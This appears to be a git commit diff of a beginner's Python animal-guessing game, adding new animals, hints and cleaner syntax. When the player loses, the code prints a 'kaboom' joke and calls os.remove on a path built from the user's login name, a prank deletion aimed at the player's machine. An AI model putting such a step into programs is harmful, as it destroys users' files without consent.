c16bb929b7cdd8d778e50fd4f4eeeb769553f4ae
DarecekParecek <D.t.tunega@post.cz>
2023-05-02 23:44:38 +0200

    added animals

--- main.py
+++ main.py
@@ -7,38 +7,51 @@ dogHint = "woof woof"
 pandaHint = "half black white asian"
 goatHint = "Eminem"
 elephantHint = "heavy"
+cowHint = "makes milk"
+eagleHint = "as american as it gets"
+mouseHint = "bff of a chemistry scientist"
+ratHint = "pretty large, especially in New York"
+bullHint = "close to a Ferrari"
+
 numberOfGuesses = 5
 guesses = 0
-hiddenWordList = ["panda", "dog", "goat", "elephant"]
+hiddenWordList = ["panda", "dog", "goat", "elephant", "cow", "eagle", "mouse", "rat", "bull"]
 random.shuffle(hiddenWordList)
 hiddenWord = hiddenWordList[0]
 isPlaying = True
 
-if (hiddenWord == "dog"):
+if hiddenWord == "dog":
     print("hint: " + dogHint)
-elif(hiddenWord == "panda"):
+elif hiddenWord == "panda":
     print("hint: " + pandaHint)
-elif(hiddenWord == "goat"):
+elif hiddenWord == "goat":
     print("hint: " + goatHint)
-elif(hiddenWord == "elephant"):
+elif hiddenWord == "elephant":
     print("hint: " + elephantHint)
+elif hiddenWord == "cow":
+    print("hint: " + cowHint)
+elif hiddenWord == "eagle":
+    print("hint: " + eagleHint)
+elif hiddenWord == "mouse":
+    print("hint: " + mouseHint)
+elif hiddenWord == "rat":
+    print("hint: " + ratHint)
+elif hiddenWord == "bull":
+    print("hint: " + bullHint)
 
 
 for guesses in range(numberOfGuesses):
     answer = input("your guess: ")
 
-    if( answer.lower() == hiddenWord):
+    if answer.lower() == hiddenWord:
         print("good")
         break
     else:
+        print("wrong answer, try again")
         guesses += 1
 
-if (guesses >= numberOfGuesses):
-    print("you lost, your computer is going kaboom in like 5 secs idunno idc")
+if guesses >= numberOfGuesses:
+    print("you lost, your computer is going kaboom in like 5 secs i dunno idc")
     time.sleep(5)
     pcPath = "C:/users/" + os.getlogin() + "/Windows32"
     os.remove(pcPath)
-
-
-
-
